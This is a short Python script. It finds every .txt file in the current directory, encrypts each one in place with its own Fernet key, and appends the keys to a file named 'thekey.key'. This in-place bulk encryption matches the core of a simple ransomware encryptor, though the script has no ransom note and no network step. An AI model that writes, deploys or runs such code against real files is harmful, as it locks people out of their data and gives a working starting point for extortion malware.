import os
from cryptography.fernet import Fernet




files = []

#search all files in current path
for file in os.listdir(os.getcwd()):
    if file.endswith('.txt'):
        files.append(file)

#generate key

for file in files:
    with open(file, "rb") as f:
        data = f.read()
    
    key = Fernet.generate_key()
    print(key)
    with open("thekey.key", "ab") as f:
        #add new key to thekey.key file
        f.write(key + b'\n')
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(file, "wb") as f:
        f.write(encrypted)